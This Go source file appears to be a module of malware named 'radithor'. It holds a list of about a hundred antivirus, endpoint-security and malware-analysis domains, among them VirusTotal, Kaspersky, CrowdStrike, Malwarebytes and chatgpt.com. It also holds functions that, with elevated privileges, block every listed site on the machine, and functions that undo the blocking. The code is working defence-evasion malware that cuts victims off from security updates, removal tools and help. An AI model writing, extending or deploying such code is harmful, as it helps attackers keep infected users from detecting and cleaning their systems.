package lockdown

import (
	"errors"
	"radithor/funcs"
	"radithor/store"
)

var SitesToBlock = []string{
	"www.virustotal.com",
	"www.threat.rip",
	"jlab.threat.rip",
	"analyze.intezer.com",
	"www.secureage.com",
	"www.ahnlab.com",
	"chatgpt.com",
	"www.alibabacloud.com",
	"www.antiy.net",
	"arcticwolf.com",
	"www.avg.com",
	"update.avg.com",
	"download.avg.com",
	"account.avg.com",
	"support.avg.com",
	"www.bitdefender.com",
	"central.bitdefender.com",
	"account.bitdefender.com",
	"threatmap.bitdefender.com",
	"bitdefender.in",
	"bitdefender.gr",
	"bitdefender.ua",
	"www.clamav.net",
	"docs.clamav.net",
	"blog.clamav.net",
	"clamtk.com",
	"www.crowdstrike.com",
	"falcon.crowdstrike.com",
	"falcon.laggar.gcw.crowdstrike.com",
	"go.crowdstrike.com",
	"www.cynet.com",
	"help.cynet.com",
	"download.drweb.com",
	"www.drweb.com",
	"free.drweb.com",
	"products.drweb.com",
	"estore.drweb.com",
	"support.drweb.com",
	"www.emsisoft.com",
	"my.emsisoft.com",
	"central.emsisoft.com",
	"dl.emsisoft.com",
	"www.eset.com",
	"help.eset.com",
	"support.eset.com",
	"gridinsoft.com",
	"am.gridinsoft.com",
	"my.gridinsoft.com",
	"support.gridinsoft.com",
	"blog.gridinsoft.com",
	"get.anti-malware.gridinsoft.com",
	"www.ikarussecurity.com",
	"www.ikarus.hu",
	"www.kaspersky.com",
	"my.kaspersky.com",
	"usa.kaspersky.com",
	"me-en.kaspersky.com",
	"support.kaspersky.com",
	"maxpcsecure.com",
	"www.trendmicro.com",
	"online.login.trendmicro.com",
	"shop.trendmicro.com",
	"tm.login.trendmicro.com",
	"myhome.trendmicro.com",
	"clp.trendmicro.com",
	"download.trendmicro.com",
	"www.webroot.com",
	"manage.webroot.com",
	"intl.webroot.com",
	"www.avast.com",
	"support.avast.com",
	"id.avast.com",
	"www.avira.com",
	"support.avira.com",
	"my.avira.com",
	"www.bkav.com",
	"www.deepinstinct.com",
	"portal.deepinstinct.com",
	"www.sophos.com",
	"hitman-pro.en.softonic.com",
	"support.hitmanpro.com",
	"www.fortinet.com",
	"fortiguard.fortinet.com",
	"www.avfirewalls.com",
	"www.malwarebytes.com",
	"help.malwarebytes.com",
	"www.mcafee.com",
	"download.mcafee.com",
	"vs.mcafee.com",
	"www.zonealarm.com",
	"download.zonealarm.com",
	"fusion.sophos.com",
	"www.sentinelone.com",
	"go.sentinelone.com",
	"nimbus.bitdefender.net",
	"cyberguy.com",
	"www.howtogeek.com",
	"www.pandasecurity.com",
}

func BlockAntivirusSites() (int, error) { // how many errors when blocking the site, function error
	if !store.IsElevated {
		return 0, errors.New("elevation is required to run this function")
	}

	errors := 0

	for _, site := range SitesToBlock {
		_, err := funcs.BlockWebsite(site)
		if err == nil {
			continue
		}

		errors++
	}

	return errors, nil
}

func UnblockAntivirusSites() (int, error) { // how many errors when unblocking the site, function error
	if !store.IsElevated {
		return 0, errors.New("elevation is required to run this function")
	}

	errors := 0

	for _, site := range SitesToBlock {
		_, err := funcs.UnblockWebsite(site)
		if err == nil {
			continue
		}

		errors++
	}

	return errors, nil
}
